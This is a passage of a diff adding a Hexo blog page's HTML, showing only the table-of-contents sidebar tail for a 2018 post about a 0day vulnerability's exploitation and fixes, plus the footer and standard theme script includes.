class="nav-item nav-level-4"><a class="nav-link" href="#第二阶：0day在野之“黑产攻击”-（2018年8月）"><span class="nav-number">3.2.</span> <span class="nav-text">第二阶：0day在野之“黑产攻击” （2018年8月）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第三阶：0day曝光之“疯狂攻击”-（2018年8月31日后）"><span class="nav-number">3.3.</span> <span class="nav-text">第三阶：0day曝光之“疯狂攻击” （2018年8月31日后）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞影响范围及修复"><span class="nav-number">4.</span> <span class="nav-text">漏洞影响范围及修复</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞修复"><span class="nav-number">4.1.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#小结"><span class="nav-number">5.</span> <span class="nav-text">小结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考链接"><span class="nav-number">6.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Badcode</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
